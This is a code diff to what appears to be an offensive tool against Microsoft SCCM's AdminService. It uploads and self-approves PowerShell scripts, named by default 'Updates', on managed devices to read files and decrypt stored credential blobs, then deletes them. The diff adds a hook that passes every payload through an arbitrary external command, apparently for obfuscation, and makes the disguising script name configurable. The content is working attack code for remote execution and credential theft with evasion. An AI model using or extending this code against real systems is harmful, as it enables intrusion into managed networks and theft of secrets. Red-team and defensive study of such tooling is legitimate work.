@@ -5,7 +5,10 @@ import hashlib
 import json
 import math
 import os
+import shlex
 import sqlite3
+import subprocess
+import tempfile
 import time
 import uuid
 import xml.etree.ElementTree as ET
@@ -1695,7 +1698,7 @@ UserPrincipalName: {tb['UserPrincipalName'].to_string(index=False, header=False)
 
 class SMSSCRIPTS(AdminServiceClient):
 
-    def __init__(self, username, password, target,  kerberos, domain, kdcHost, logs_dir, auser, apassword, accache=None):
+    def __init__(self, username, password, target,  kerberos, domain, kdcHost, logs_dir, auser, apassword,  accache=None, ps_transform=None):
         super().__init__(username, password, target,  kerberos, domain, kdcHost, logs_dir)
         self.approve_user = auser
         self.approve_password = apassword
@@ -1705,6 +1708,90 @@ class SMSSCRIPTS(AdminServiceClient):
         self.opid = ""
         self.guid = ""
         self.device = ""
+        self.ps_transform = ps_transform
+        self.script_name = "Updates"
+        self.script_author = ""
+
+    def _apply_transform(self, script_text):
+        cmd = self.ps_transform
+        has_input = '{input}' in cmd
+        has_output = '{output}' in cmd
+
+        logger.debug(f"[*] Applying PS transform: {cmd}")
+
+        try:
+            if not has_input and not has_output:
+                return self._transform_pipe(cmd, script_text)
+            else:
+                return self._transform_file(cmd, script_text, has_input, has_output)
+        except FileNotFoundError:
+            raise RuntimeError(f"PS transform command not found: {shlex.split(cmd)[0]}")
+        except subprocess.TimeoutExpired:
+            raise RuntimeError("PS transform command timed out after 30 seconds")
+
+    def _transform_pipe(self, cmd, script_text):
+        result = subprocess.run(
+            shlex.split(cmd),
+            input=script_text,
+            capture_output=True,
+            text=True,
+            timeout=30
+        )
+
+        if result.returncode != 0:
+            raise RuntimeError(f"PS transform failed (exit {result.returncode}): {result.stderr.strip()}")
+        if not result.stdout.strip():
+            raise RuntimeError("PS transform command produced empty output")
+        
+        logger.debug(f"[+] PS transform applied")
+        return result.stdout
+
+    def _transform_file(self, cmd, script_text, has_input, has_output):
+        input_path = None
+        output_path = None
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as f:
+                f.write(script_text)
+                input_path = f.name
+
+            if has_output:
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as f:
+                    output_path = f.name
+
+            updated_cmd = cmd
+            if has_input:
+                updated_cmd = updated_cmd.replace('{input}', shlex.quote(input_path))
+            if has_output:
+                updated_cmd = updated_cmd.replace('{output}', shlex.quote(output_path))
+
+            result = subprocess.run(
+                shlex.split(updated_cmd),
+                capture_output=True,
+                text=True,
+                timeout=30,
+                input=script_text if not has_input else None
+            )
+
+            if result.returncode != 0:
+                raise RuntimeError(f"PS transform failed (exit {result.returncode}): {result.stderr.strip()}")
+
+            if has_output:
+                with open(output_path, 'r') as f:
+                    transformed = f.read()
+            else:
+                transformed = result.stdout
+
+            if not transformed.strip():
+                raise RuntimeError("PS transform command produced empty output")
+
+            logger.debug(f"[+] PS transform applied")
+            return transformed
+        
+        finally:
+            if input_path and os.path.exists(input_path):
+                os.unlink(input_path)
+            if output_path and os.path.exists(output_path):
+                os.unlink(output_path)
 
     def run(self, device, optional_target=None):
         if optional_target:
@@ -1723,6 +1810,10 @@ Do-Delete
         with open(f"{self.script}", "r", encoding='utf-8') as f:
             file_content = f.read()
             file_content += cleanup
+            
+            if self.ps_transform:
+                file_content = self._apply_transform(file_content)
+            
             bom = codecs.BOM_UTF16_LE
             byte_array = bom + file_content.encode('utf-16-le')
             script_body = base64.b64encode(byte_array).decode('utf-8')
@@ -1760,9 +1851,9 @@ Do-Delete
                 script_body = self.read_script()
             self.guid = str(uuid.uuid4())
             body = {"ApprovalState": 3,
-            "ParamsDefinition": "", 
-            "ScriptName": "Updates",
-            "Author": "",
+            "ParamsDefinition": "",
+            "ScriptName": self.script_name,
+            "Author": self.script_author,
             "Script": f"{script_body}",
             "ScriptVersion": "1",
             "ScriptType": 0,
@@ -1774,7 +1865,7 @@ Do-Delete
             try:
                 r = self.http_post(url, json_data=body)
                 if r.status_code == 201:
-                        logger.info(f"[+] Updates script created successfully with GUID {self.guid}.")
+                        logger.info(f"[+] Script '{self.script_name}' created successfully with GUID {self.guid}.")
                         self.approve_script()
             except KeyboardInterrupt:
                 logger.info("Ctrl-C detected. Deleting script ... ")
@@ -1995,7 +2086,11 @@ function Do-Delete {
 }
 do-cat
 Do-Delete
-''' %file 
+''' %file
+
+        if self.ps_transform:
+            script = self._apply_transform(script)
+            
         bom = codecs.BOM_UTF16_LE
         byte_array = bom + script.encode('utf-16-le')
         script_body = base64.b64encode(byte_array).decode('utf-8')
@@ -2047,6 +2142,10 @@ Do-Delete
     Invoke-Decrypt -Hex %r
     Do-Delete
     ''' %blob
+    
+        if self.ps_transform:
+            script = self._apply_transform(script)
+            
         bom = codecs.BOM_UTF16_LE
         byte_array = bom + script.encode('utf-16-le')
         script_body = base64.b64encode(byte_array).decode('utf-8')
@@ -2112,6 +2211,10 @@ function Do-Delete {
 Invoke-DecryptEx -sessionKey %r -encryptedPwd %r
 Do-Delete
     '''%(session_key, encrypted_blob)
+    
+        if self.ps_transform:
+            script = self._apply_transform(script)
+            
         bom = codecs.BOM_UTF16_LE
         byte_array = bom + script.encode('utf-16-le')
         script_body = base64.b64encode(byte_array).decode('utf-8')
